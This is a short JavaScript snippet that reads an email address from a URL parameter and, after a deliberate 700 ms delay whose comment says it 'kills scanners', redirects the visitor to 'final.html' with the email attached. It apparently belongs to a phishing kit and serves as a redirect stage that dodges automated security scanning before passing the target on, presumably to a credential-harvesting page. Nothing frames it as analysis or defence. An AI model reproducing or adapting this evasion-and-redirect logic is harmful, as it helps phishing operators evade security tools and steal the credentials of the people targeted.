(() => {
  const params = new URLSearchParams(window.location.search);
  const email = params.get("print");

  if (!email) {
    document.body.innerText = "Invalid request";
    return;
  }

  // Small delay = kills scanners
  setTimeout(() => {
    window.location.replace(
      "final.html?print=" +
      encodeURIComponent(email)
    );
  }, 700);
})();
